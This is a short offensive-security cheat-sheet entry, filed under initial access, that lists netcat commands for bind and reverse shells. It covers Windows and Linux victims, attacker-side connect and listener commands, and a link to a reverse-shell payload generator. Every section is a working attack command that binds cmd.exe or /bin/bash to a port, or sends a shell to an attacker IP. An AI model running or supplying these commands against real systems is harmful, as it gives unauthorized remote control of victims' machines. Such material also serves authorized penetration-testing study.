---
title: Bind and Reverse Shells with Netcat
category: initial-access
subcategory: shells
os: linux, windows
command: nc -nvlp 1234
tools: nc
---


### Bind shell - Windows victim

```bash
nc.exe -nvlp 1234 -e cmd.exe
```

Attacker:

```bash
nc -nv 10.4.21.221 1234
```

### Bind shell - Linux victim

```bash
nc -nvlp 1234 -c /bin/bash
```

Attacker:

```bash
nc -nv 10.10.3.2 1234
```

### Reverse shell - Windows victim to Linux attacker

Victim:

```bash
nc.exe -nv 10.10.0.2 1234 -e cmd.exe
```

### Reverse shell - Linux victim

```bash
nc -nv 10.10.0.2 1234 -e /bin/bash
```

### Listener

```bash
nc -nvlp 1234
```

### Reference for shell payloads

https://www.revshells.com/
